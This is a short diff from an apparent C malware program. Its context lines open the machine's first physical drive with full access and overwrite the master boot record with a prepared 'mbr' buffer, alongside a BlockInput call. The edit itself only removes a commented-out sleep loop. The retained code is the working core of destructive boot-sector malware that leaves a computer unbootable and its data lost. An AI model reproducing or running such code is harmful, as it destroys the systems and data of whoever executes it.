@@ -73,13 +73,6 @@ int main(int agrc, char *argv[])
     HANDLE Target = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,NULL,NULL);
     WriteFile(Target,mbr,MBR,&write,NULL);
     int i;
-    /*
-    while(i < 100)
-    {
-        Sleep(1000);
-        
-    }
-    */
     BlockInput(false);
     CloseHandle(Target);
     return 0;
